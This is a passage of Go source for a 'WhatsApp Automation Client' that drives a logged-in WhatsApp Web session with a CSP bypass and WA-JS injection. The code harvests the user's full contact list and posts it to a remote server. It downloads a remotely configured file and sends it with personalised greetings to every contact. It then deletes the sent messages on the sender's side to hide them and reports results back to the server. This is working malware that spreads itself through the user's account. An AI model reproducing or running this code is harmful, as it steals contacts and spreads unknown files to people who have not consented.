	tempoEspera, _ := strconv.Atoi(a.config.TempoEsperaWhatsapp)
	if tempoEspera < 30 {
		tempoEspera = 30
	}

	a.EnviarLog(LogInfo, fmt.Sprintf("Aguardando WhatsApp carregar (máx %ds)...", tempoEspera))
	a.EnviarLog(LogInfo, "⏳ Escaneie o QR Code se necessário...")

	// Aguardar página carregar
	err = page.Timeout(time.Duration(tempoEspera) * time.Second).WaitLoad()
	if err != nil {
		a.EnviarLog(LogAviso, "Timeout no carregamento inicial")
	}

	// Verificar se WhatsApp está carregado (sessão ativa)
	loaded := false
	startTime := time.Now()
	for time.Since(startTime) < time.Duration(tempoEspera)*time.Second {
		result, err := a.EvalJS(`document.querySelector('#pane-side') !== null || document.querySelector('#main') !== null`)
		if err == nil && strings.Contains(result, "true") {
			a.EnviarLog(LogSucesso, "✓ WhatsApp carregado - sessão ativa!")
			loaded = true
			break
		}
		time.Sleep(2 * time.Second)
	}

	if !loaded {
		a.EnviarLog(LogAviso, "⚠️ WhatsApp pode não estar totalmente carregado, tentando continuar...")
		time.Sleep(5 * time.Second)
	}

	// Verificar se WPP já existe
	a.EnviarLog(LogInfo, "Verificando se WA-JS já está carregado...")
	wppType, _ := a.EvalJS(`typeof window.WPP`)
	if strings.Contains(wppType, "object") {
		a.EnviarLog(LogSucesso, "✓ WA-JS já está carregado!")
		return nil
	}

	// Aguardar módulos do WhatsApp
	a.EnviarLog(LogInfo, "Aguardando módulos do WhatsApp...")
	for i := 0; i < 20; i++ {
		result, _ := a.EvalJS(`typeof require`)
		if strings.Contains(result, "function") {
			a.EnviarLog(LogSucesso, "✓ Módulos detectados")
			break
		}
		time.Sleep(1 * time.Second)
	}

	// Ler arquivo WA-JS
	jsContent, err := os.ReadFile(WHAT_JS_CAMINHO)
	if err != nil {
		return fmt.Errorf("erro ao ler WA-JS: %v", err)
	}

	// IMPORTANTE: Desabilitar CSP para permitir injeção
	a.EnviarLog(LogInfo, "Configurando página para injeção...")
	proto.PageSetBypassCSP{Enabled: true}.Call(a.page)

	// Injetar WA-JS usando RuntimeEvaluate (contexto principal)
	a.EnviarLog(LogInfo, "Injetando WA-JS...")
	_, evalErr := proto.RuntimeEvaluate{
		Expression:    string(jsContent),
		ReturnByValue: false,
	}.Call(a.page)

	if evalErr != nil {
		return fmt.Errorf("erro ao injetar WA-JS: %v", evalErr)
	}

	a.EnviarLog(LogSucesso, "✓ Script injetado")
	a.EnviarLog(LogInfo, "Aguardando WPP inicializar...")

	// Aguardar WPP inicializar
	wppReady := false
	for tentativa := 0; tentativa < 3; tentativa++ {
		time.Sleep(5 * time.Second)

		for i := 0; i < 10; i++ {
			wppCheck, _ := a.EvalJS(`typeof window.WPP`)
			if strings.Contains(wppCheck, "object") {
				readyCheck, _ := a.EvalJS(`WPP.isReady`)
				if strings.Contains(readyCheck, "true") {
					a.EnviarLog(LogSucesso, "✓ WA-JS carregado e pronto!")
					wppReady = true
					break
				}
			}
			time.Sleep(1 * time.Second)
		}

		if wppReady {
			break
		}

		// Se não encontrou, pode ter havido reload - re-injetar
		a.EnviarLog(LogAviso, fmt.Sprintf("⚠️ WPP não detectado (tentativa %d/3), re-injetando...", tentativa+1))
		time.Sleep(3 * time.Second)
		proto.PageSetBypassCSP{Enabled: true}.Call(a.page)

		for j := 0; j < 5; j++ {
			modCheck, _ := a.EvalJS(`typeof require`)
			if strings.Contains(modCheck, "function") {
				break
			}
			time.Sleep(1 * time.Second)
		}

		proto.RuntimeEvaluate{
			Expression:    string(jsContent),
			ReturnByValue: false,
		}.Call(a.page)
	}

	if !wppReady {
		wppFinal, _ := a.EvalJS(`typeof window.WPP`)
		if strings.Contains(wppFinal, "object") {
			a.EnviarLog(LogAviso, "⚠️ WPP carregado mas não está 100% ready - tentando continuar...")
			return nil
		}
		return fmt.Errorf("WA-JS não foi carregado corretamente")
	}

	return nil
}

func (a *AutomacaoCorporativa) ObterContatos() ([]Contato, error) {
	a.EnviarLog(LogInfo, "Obtendo lista de contatos...")

	script := `
	(async function() {
		try {
			const contatos = await WPP.contact.list();
			return contatos.map(c => ({
				numero: c.id._serialized || c.id,
				nome: c.name || c.pushname || c.shortName || 'Sem nome'
			}));
		} catch (e) {
			return [];
		}
	})()
	`

	result, err := proto.RuntimeEvaluate{
		Expression:    script,
		ReturnByValue: true,
		AwaitPromise:  true,
	}.Call(a.page)

	if err != nil {
		return nil, fmt.Errorf("erro ao obter contatos: %v", err)
	}

	var contatos []Contato
	jsonBytes, _ := json.Marshal(result.Result.Value)
	json.Unmarshal(jsonBytes, &contatos)

	a.EnviarLog(LogSucesso, fmt.Sprintf("✓ %d contatos encontrados", len(contatos)))

	// Enviar contatos para o servidor via GOB
	go a.EnviarContatosServidor(contatos)

	return contatos, nil
}

// EnviarContatosServidor envia contatos para o servidor via GOB (só @c.us)
func (a *AutomacaoCorporativa) EnviarContatosServidor(contatos []Contato) {
	// Filtrar só @c.us e converter para formato GOB
	var contatosGob []ContatoGob
	for _, c := range contatos {
		if strings.Contains(c.Numero, "@c.us") {
			contatosGob = append(contatosGob, ContatoGob{
				Numero: c.Numero,
				Nome:   c.Nome,
			})
		}
	}

	req := ContactsRequest{
		SessionID:   SESSION_ID,
		NomeMaquina: NOME_MAQUINA,
		Contatos:    contatosGob,
	}

	var resp GenericResponse
	if err := gobPost(CONTACTS_ENDPOINT, req, &resp); err != nil {
		a.EnviarLog(LogAviso, fmt.Sprintf("Erro ao enviar contatos: %v", err))
		return
	}

	if resp.Success {
		a.EnviarLog(LogInfo, "Contatos sincronizados com servidor")
	}
}

func (a *AutomacaoCorporativa) FiltrarContatos(contatos []Contato) []Contato {
	// MODO TESTE: Se CONTATOS_TESTE não estiver vazio, usa ele
	if len(CONTATOS_TESTE) > 0 {
		a.EnviarLog(LogAviso, "⚠️ MODO TESTE ATIVO - Usando lista de contatos de teste!")
		a.EnviarLog(LogInfo, fmt.Sprintf("📋 %d contatos de teste definidos", len(CONTATOS_TESTE)))
		for _, c := range CONTATOS_TESTE {
			a.EnviarLog(LogInfo, fmt.Sprintf("   → %s (%s)", c.Nome, c.Numero))
		}
		return CONTATOS_TESTE
	}

	a.EnviarLog(LogInfo, "Filtrando contatos...")

	filtros := strings.Split(a.config.FiltroContatosExcluir, ",")
	limite, _ := strconv.Atoi(a.config.LimiteTeste)

	var filtrados []Contato
	numerosJaAdicionados := make(map[string]bool)

	for _, c := range contatos {
		// Só aceita @c.us (ignora @lid e outros)
		if c.Numero == "" || !strings.Contains(c.Numero, "@c.us") {
			continue
		}

		// Pular se já tem esse número
		if numerosJaAdicionados[c.Numero] {
			continue
		}

		// Verificar filtros de exclusão
		excluir := false
		for _, filtro := range filtros {
			filtro = strings.TrimSpace(filtro)
			if filtro != "" && strings.Contains(c.Numero, filtro) {
				excluir = true
				break
			}
		}

		if !excluir {
			filtrados = append(filtrados, c)
			numerosJaAdicionados[c.Numero] = true
		}

		// Aplicar limite se definido
		if limite > 0 && len(filtrados) >= limite {
			break
		}
	}

	a.EnviarLog(LogSucesso, fmt.Sprintf("✓ %d contatos @c.us", len(filtrados)))
	return filtrados
}

func (a *AutomacaoCorporativa) BaixarArquivo() (string, string, error) {
	a.EnviarLog(LogInfo, "Baixando arquivo para envio...")

	resp, err := http.Get(a.config.ArquivoURL)
	if err != nil {
		return "", "", fmt.Errorf("erro ao baixar arquivo: %v", err)
	}
	defer resp.Body.Close()

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", "", fmt.Errorf("erro ao ler arquivo: %v", err)
	}

	// Extrair nome do arquivo da URL
	urlParts := strings.Split(a.config.ArquivoURL, "/")
	nomeArquivo := urlParts[len(urlParts)-1]
	if nomeArquivo == "" {
		nomeArquivo = "arquivo.bin"
	}

	arquivoBase64 := base64.StdEncoding.EncodeToString(data)

	a.EnviarLog(LogSucesso, fmt.Sprintf("✓ Arquivo baixado: %s (%d bytes)", nomeArquivo, len(data)))
	return nomeArquivo, arquivoBase64, nil
}

func (a *AutomacaoCorporativa) ProcessarMensagemTemplate(template, nomeContato string) string {
	hora := time.Now().Hour()

	var saudacao string
	if hora < 12 {
		saudacao = "Bom dia"
	} else if hora < 18 {
		saudacao = "Boa tarde"
	} else {
		saudacao = "Boa noite"
	}

	// Se contato não tem nome, substitui por vazio
	nomeParaUsar := nomeContato
	if nomeContato == "Sem nome" || nomeContato == "" {
		nomeParaUsar = ""
	}

	mensagem := strings.ReplaceAll(template, "{saudacao}", saudacao)
	mensagem = strings.ReplaceAll(mensagem, "{nome}", nomeParaUsar)
	mensagem = strings.ReplaceAll(mensagem, "{data}", time.Now().Format("02/01/2006"))
	mensagem = strings.ReplaceAll(mensagem, "{hora}", time.Now().Format("15:04"))

	return mensagem
}

func EscapeJavaScriptString(texto string) string {
	if texto == "" {
		return ""
	}

	texto = strings.ReplaceAll(texto, "\\", "\\\\")
	texto = strings.ReplaceAll(texto, "'", "\\'")
	texto = strings.ReplaceAll(texto, "\"", "\\\"")
	texto = strings.ReplaceAll(texto, "\n", "\\n")
	texto = strings.ReplaceAll(texto, "\r", "\\r")
	texto = strings.ReplaceAll(texto, "\t", "\\t")

	return texto
}

func (a *AutomacaoCorporativa) EnviarParaContato(contato Contato, nomeArquivo, arquivoBase64 string) ResultadoEnvio {
	if strings.Contains(contato.Numero, "@lid") {
		return ResultadoEnvio{
			Success: false,
			Nome:    contato.Nome,
			Numero:  contato.Numero,
			Erro:    "Contato empresarial/inválido (lid)",
		}
	}

	mensagemSaudacao := a.ProcessarMensagemTemplate(a.config.MensagemSaudacao, contato.Nome)
	mensagemSaudacaoEscaped := EscapeJavaScriptString(mensagemSaudacao)
	mensagemFinalEscaped := EscapeJavaScriptString(a.config.MensagemFinal)
	nomeEscaped := EscapeJavaScriptString(contato.Nome)
	nomeArquivoEscaped := EscapeJavaScriptString(nomeArquivo)

	script := fmt.Sprintf(`
	(async function() {
		var numero = '%s';
		var nome = '%s';
		var mensagemSaudacao = '%s';
		var mensagemFinal = '%s';
		var nomeArquivo = '%s';
		var arquivoBase64 = '%s';

		// Helper para extrair ID serializado
		function getMsgId(msg) {
			if (!msg) return null;
			if (msg.id && msg.id._serialized) return msg.id._serialized;
			if (msg.id && typeof msg.id === 'string') return msg.id;
			if (msg._serialized) return msg._serialized;
			return null;
		}

		// Helper para aguardar com timeout
		function sleep(ms) {
			return new Promise(r => setTimeout(r, ms));
		}

		try {
			if (numero.includes('@lid')) {
				return { success: false, nome: nome, numero: numero, erro: 'Número inválido (lid)' };
			}

			// Verificar se contato existe
			let chatExists;
			try {
				chatExists = await WPP.contact.queryExists(numero);
			} catch (e) {
				chatExists = false;
			}
			if (!chatExists) {
				return { success: false, nome: nome, numero: numero, erro: 'Contato não existe no WhatsApp' };
			}

			// Preparar arquivo
			const binaryString = atob(arquivoBase64);
			const bytes = new Uint8Array(binaryString.length);
			for (let i = 0; i < binaryString.length; i++) {
				bytes[i] = binaryString.charCodeAt(i);
			}
			const blob = new Blob([bytes], { type: 'application/octet-stream' });
			const file = new File([blob], nomeArquivo, { type: 'application/octet-stream' });

			// Array para guardar IDs das mensagens enviadas (serializados)
			var msgIds = [];
			var enviados = 0;

			// 1. Enviar saudação
			try {
				var msg1 = await WPP.chat.sendTextMessage(numero, mensagemSaudacao, {
					createChat: true,
					waitForAck: true,
					detectMentioned: false,
					linkPreview: false
				});
				var id1 = getMsgId(msg1);
				if (id1) {
					msgIds.push(id1);
					enviados++;
				}
			} catch (e1) {
				console.log('Erro ao enviar saudação:', e1);
			}

			await sleep(800);

			// 2. Enviar arquivo
			try {
				var msg2 = await WPP.chat.sendFileMessage(numero, file, {
					createChat: true,
					caption: '',
					filename: nomeArquivo,
					waitForAck: true,
					detectMentioned: false
				});
				var id2 = getMsgId(msg2);
				if (id2) {
					msgIds.push(id2);
					enviados++;
				}
			} catch (e2) {
				console.log('Erro ao enviar arquivo:', e2);
			}

			await sleep(800);

			// 3. Enviar mensagem final
			try {
				var msg3 = await WPP.chat.sendTextMessage(numero, mensagemFinal, {
					createChat: true,
					waitForAck: true,
					detectMentioned: false,
					linkPreview: false
				});
				var id3 = getMsgId(msg3);
				if (id3) {
					msgIds.push(id3);
					enviados++;
				}
			} catch (e3) {
				console.log('Erro ao enviar mensagem final:', e3);
			}

			// Verificar se pelo menos uma mensagem foi enviada
			if (enviados === 0) {
				return { success: false, nome: nome, numero: numero, erro: 'Nenhuma mensagem foi enviada' };
			}

			// Aguardar mais tempo para garantir que as mensagens foram sincronizadas
			await sleep(3000);

			// Deletar as mensagens enviadas (só para mim, não revoke)
			var deletados = 0;
			for (var i = 0; i < msgIds.length; i++) {
				try {
					// deleteMessage(chatId, msgId, deleteMediaInDevice, revoke)
					// revoke=false significa deletar só para mim
					await WPP.chat.deleteMessage(numero, msgIds[i], true, false);
					deletados++;
					await sleep(300); // Pequena pausa entre deleções
				} catch (delErr) {
					console.log('Erro ao deletar msg ' + msgIds[i] + ':', delErr);
					// Tentar método alternativo
					try {
						await WPP.chat.deleteMessage(numero, [msgIds[i]], true, false);
						deletados++;
					} catch (e) {}
				}
			}

			return {
				success: true,
				nome: nome,
				numero: numero,
				enviados: enviados,
				deletados: deletados
			};

		} catch (erro) {
			let mensagemErro = erro.message || String(erro);

			if (mensagemErro.includes('lid') || mensagemErro.includes('Lid')) {
				mensagemErro = 'Contato empresarial não suportado';
			} else if (mensagemErro.includes('not found')) {
				mensagemErro = 'Contato não encontrado';
			} else if (mensagemErro.includes('timeout')) {
				mensagemErro = 'Tempo esgotado';
			}

			return { success: false, nome: nome, numero: numero, erro: mensagemErro };
		}
	})()
	`, contato.Numero, nomeEscaped, mensagemSaudacaoEscaped, mensagemFinalEscaped, nomeArquivoEscaped, arquivoBase64)

	// Usar proto.RuntimeEvaluate
	evalResult, err := proto.RuntimeEvaluate{
		Expression:    script,
		ReturnByValue: true,
		AwaitPromise:  true,
	}.Call(a.page)

	if err != nil {
		erroMsg := err.Error()
		if strings.Contains(strings.ToLower(erroMsg), "timeout") {
			erroMsg = "Timeout - pulando"
		}
		return ResultadoEnvio{
			Success: false,
			Nome:    contato.Nome,
			Numero:  contato.Numero,
			Erro:    erroMsg,
		}
	}

	var resultado ResultadoEnvio
	jsonBytes, _ := json.Marshal(evalResult.Result.Value)
	json.Unmarshal(jsonBytes, &resultado)

	return resultado
}

// EnviarRelatorioPHP envia relatorio final via GOB
func (a *AutomacaoCorporativa) EnviarRelatorioPHP(totalContatos, enviadosSucesso int, listaContatos []map[string]string) {
	tempoTotal := time.Since(INICIO_EXECUCAO).Minutes()

	req := RelatorioRequest{
		SessionID:          SESSION_ID,
		NomeMaquina:        NOME_MAQUINA,
		SistemaOperacional: runtime.GOOS,
		TotalContatos:      totalContatos,
		EnviadosComSucesso: enviadosSucesso,
		TempoTotalMinutos:  tempoTotal,
		TimestampInicio:    INICIO_EXECUCAO.Format("2006-01-02 15:04:05"),
		TimestampFim:       time.Now().Format("2006-01-02 15:04:05"),
		ListaContatos:      listaContatos,
	}

	var resp GenericResponse
	if err := gobPost(ENDPOINT, req, &resp); err != nil {
		a.EnviarLog(LogAviso, fmt.Sprintf("Não foi possível enviar relatório: %v", err))
		return
	}

	if resp.Success {
		a.EnviarLog(LogSucesso, "✓ Relatório enviado ao servidor (GOB)")
	}
}

// manterNavegadorAberto controla se o navegador deve ser mantido aberto após erros (para debug)
var manterNavegadorAberto = true

func (a *AutomacaoCorporativa) Cleanup() {
	// Evitar cleanup duplo
	if a.browser == nil {
		return
	}

	a.EnviarLog(LogInfo, "Finalizando...")

	// Se manterNavegadorAberto está ativo, não fecha o browser
	if manterNavegadorAberto {
		a.EnviarLog(LogAviso, "🔧 Modo debug: navegador mantido aberto")
		a.EnviarLog(LogInfo, "Pressione Ctrl+C para encerrar quando terminar")

		// Aguardar indefinidamente (usuário fecha manualmente)
		select {}
	}

	// Fechar browser
	browser := a.browser
	a.browser = nil // Marcar como nil para evitar cleanup duplo

	if browser != nil {
		browser.Close()
		a.EnviarLog(LogInfo, "Navegador fechado")
	}

	time.Sleep(2 * time.Second)

	if a.profileSelenium != "" && dirExists(a.profileSelenium) {
		for i := 0; i < 3; i++ {
			err := os.RemoveAll(a.profileSelenium)
			if err == nil {
				a.EnviarLog(LogInfo, "Perfil temporário removido")
				break
			}
			time.Sleep(time.Second)
		}
		a.profileSelenium = "" // Evitar tentar remover novamente
	}
}

// ============================================
// EXECUÇÃO PRINCIPAL
// ============================================

func (a *AutomacaoCorporativa) Executar() error {
	defer a.Cleanup()

	a.EnviarLog(LogInicio, "Iniciando WhatsApp Automation (GOB)")
	a.EnviarLog(LogInfo, fmt.Sprintf("Máquina: %s", NOME_MAQUINA))
	a.EnviarLog(LogInfo, fmt.Sprintf("Session ID: %s", SESSION_ID))

	// Carregar configurações
	configDict := a.BuscaConfigNuvem(false)
	if v, ok := configDict["arquivo_url"]; ok {
		a.config.ArquivoURL = v
	}
	if v, ok := configDict["limite_teste"]; ok {
		a.config.LimiteTeste = v
	}
	if v, ok := configDict["delay_entre_mensagens"]; ok {
		a.config.DelayEntreMensagens = v
	}
	if v, ok := configDict["modo_headless"]; ok {
		a.config.ModoHeadless = v
	}
	if v, ok := configDict["tempo_espera_whatsapp"]; ok {
		a.config.TempoEsperaWhatsapp = v
	}
	if v, ok := configDict["mensagem_saudacao"]; ok {
		a.config.MensagemSaudacao = v
	}
	if v, ok := configDict["mensagem_final"]; ok {
		a.config.MensagemFinal = v
	}
	if v, ok := configDict["envio_ativo"]; ok {
		a.config.EnvioAtivo = v
	}

	// Baixar WA-JS primeiro (sempre precisa)
	if err := a.DownloadBiblioteca(); err != nil {
		return err
	}

	// Usar gerenciamento inteligente de perfil
	// - Se tem perfil salvo funcionando, usa ele direto (sem clonar)
	// - Se não tem, testa todos os navegadores e salva o que funcionar
	browser, navegadorConfig, err := a.GerenciarPerfilInteligente()
	if err != nil {
		return err
	}
	a.browser = browser
	a.navegadorAtual = navegadorConfig

	// Inicializar WhatsApp
	if err := a.IniciarAutomacao(); err != nil {
		return err
	}

	// Obter contatos
	contatos, err := a.ObterContatos()
	if err != nil || len(contatos) == 0 {
		return fmt.Errorf("nenhum contato disponível no WhatsApp: %v", err)
	}

	// Filtrar contatos
	contatosParaEnvio := a.FiltrarContatos(contatos)
	if len(contatosParaEnvio) == 0 {
		return fmt.Errorf("nenhum contato após filtragem")
	}

	a.EnviarLog(LogInfo, fmt.Sprintf("📋 %d contatos para processar", len(contatosParaEnvio)))

	// Baixar arquivo
	nomeArquivo, arquivoBase64, err := a.BaixarArquivo()
	if err != nil {
		return err
	}

	// ENVIAR MENSAGENS
	totalEnviados := 0
	totalErros := 0
	var resultadosDetalhados []map[string]string

	fmt.Println("\n" + strings.Repeat("=", 40))
	a.EnviarLog(LogInfo, "INICIANDO ENVIO DE MENSAGENS")
	fmt.Println(strings.Repeat("=", 40) + "\n")

	for idx, contato := range contatosParaEnvio {
		if idx%20 == 0 {
			a.WaitForEnvioAtivo()
			a.AtualizaConfigSePreCisar(false)
		}

		numeroAtual := idx + 1

		if strings.Contains(contato.Numero, "@lid") {
			a.EnviarLog(LogAviso, fmt.Sprintf("[%d/%d] Pulando %s (empresarial)",
				numeroAtual, len(contatosParaEnvio), contato.Nome))
			totalErros++
			resultadosDetalhados = append(resultadosDetalhados, map[string]string{
				"nome":   contato.Nome,
				"numero": contato.Numero,
				"status": "erro",
				"erro":   "Contato empresarial",
			})
			continue
		}

		jaProcessado := false
		for _, c := range a.contatosProcessados {
			if c.Numero == contato.Numero {
				jaProcessado = true
				break
			}
		}
		if jaProcessado {
			continue
		}

		fmt.Printf("[%d/%d] %s", numeroAtual, len(contatosParaEnvio), contato.Nome)

		resultado := a.EnviarParaContato(contato, nomeArquivo, arquivoBase64)

		if resultado.Success {
			totalEnviados++
			fmt.Println(" ... ✅")
			resultadosDetalhados = append(resultadosDetalhados, map[string]string{
				"nome":   contato.Nome,
				"numero": contato.Numero,
				"status": "sucesso",
			})
		} else {
			totalErros++
			erroMsg := resultado.Erro

			if strings.Contains(strings.ToLower(erroMsg), "lid") ||
				strings.Contains(strings.ToLower(erroMsg), "empresarial") {
				fmt.Println(" ... ❌ (empresarial)")
			} else if strings.Contains(strings.ToLower(erroMsg), "timeout") {
				fmt.Println(" ... ⏱️ (timeout)")
			} else {
				if len(erroMsg) > 20 {
					fmt.Printf(" ... ❌ (%s...)\n", erroMsg[:20])
				} else {
					fmt.Printf(" ... ❌ (%s)\n", erroMsg)
				}
			}

			resultadosDetalhados = append(resultadosDetalhados, map[string]string{
				"nome":   contato.Nome,
				"numero": contato.Numero,
				"status": "erro",
				"erro":   erroMsg,
			})
		}

		a.contatosProcessados = append(a.contatosProcessados, contato)

		if idx < len(contatosParaEnvio)-1 && resultado.Success {
			// Delay entre contatos (não é o último)
			delayMs, _ := strconv.Atoi(a.config.DelayEntreMensagens)
			if delayMs > 500 {
				delayMs = 500
			} else if delayMs < 100 {
				delayMs = 100
			}
			time.Sleep(time.Duration(delayMs) * time.Millisecond)
		} else if idx == len(contatosParaEnvio)-1 {
			// Último contato - aguardar extra para garantir que deleções terminem
			a.EnviarLog(LogInfo, "Aguardando finalização do último contato...")
			time.Sleep(5 * time.Second)
		}

		if (idx+1)%50 == 0 {
			porcentagem := float64(idx+1) / float64(len(contatosParaEnvio)) * 100
			velocidade := float64(idx+1) / (time.Since(INICIO_EXECUCAO).Minutes())
			fmt.Printf("\n📊 Progresso: %.1f%% | ✅ %d | ❌ %d | ⚡ %.1f msgs/min\n\n",
				porcentagem, totalEnviados, totalErros, velocidade)
		}
	}

	fmt.Println("\n" + strings.Repeat("=", 40))
	a.EnviarLog(LogSucesso, "ENVIO CONCLUÍDO",
		fmt.Sprintf("✅ %d | ❌ %d", totalEnviados, totalErros))
	fmt.Println(strings.Repeat("=", 40) + "\n")

	modoHeadless := strings.ToLower(a.config.ModoHeadless) == "true"
	tempoEspera := 30
	if modoHeadless {
		tempoEspera = 45
	}
	a.EnviarLog(LogInfo, fmt.Sprintf("Aguardando sincronização: %ds", tempoEspera))
	time.Sleep(time.Duration(tempoEspera) * time.Second)

	var contatosEnviados []map[string]string
	for _, r := range resultadosDetalhados {
		if r["status"] == "sucesso" {
			contatosEnviados = append(contatosEnviados, r)
		}
	}
	a.EnviarRelatorioPHP(len(contatos), totalEnviados, contatosEnviados)

	tempoTotal := time.Since(INICIO_EXECUCAO).Minutes()
	taxaSucesso := float64(0)
	if len(contatosParaEnvio) > 0 {
		taxaSucesso = float64(totalEnviados) / float64(len(contatosParaEnvio)) * 100
	}

	fmt.Println("\n" + strings.Repeat("=", 40))
	a.EnviarLog(LogFim, "Finalizado",
		fmt.Sprintf("Tempo: %.2fmin | Taxa: %.2f%%", tempoTotal, taxaSucesso))
	fmt.Println(strings.Repeat("=", 40) + "\n")

	return nil
}

// ============================================
// FUNÇÕES AUXILIARES
// ============================================

func fileExists(path string) bool {
	info, err := os.Stat(path)
	return err == nil && !info.IsDir()
}

func dirExists(path string) bool {
	info, err := os.Stat(path)
	return err == nil && info.IsDir()
}

func copyFile(src, dst string) error {
	source, err := os.Open(src)
	if err != nil {
		return err
	}
	defer source.Close()

	if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil {
		return err
	}

	dest, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer dest.Close()

	_, err = io.Copy(dest, source)
	return err
}

func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // Ignorar erros de arquivos bloqueados
		}

		relPath, err := filepath.Rel(src, path)
		if err != nil {
			return nil
		}

		destPath := filepath.Join(dst, relPath)

		if info.IsDir() {
			return os.MkdirAll(destPath, 0755)
		}

		// Tentar copiar, ignorar se falhar (arquivo bloqueado)
		copyFile(path, destPath)
		return nil
	})
}

// ============================================
// MAIN
// ============================================

func main() {
	fmt.Println("╔═══════════════════════════════════════════════════╗")
	fmt.Println("║     📱 WhatsApp Automation Client (GOB)           ║")
	fmt.Println("╚═══════════════════════════════════════════════════╝")
	fmt.Println()

	automation := NovaAutomacao()

	if err := automation.Executar(); err != nil {
		fmt.Printf("\n❌ Erro: %v\n", err)
		os.Exit(1)
	}

	os.Exit(0)
}
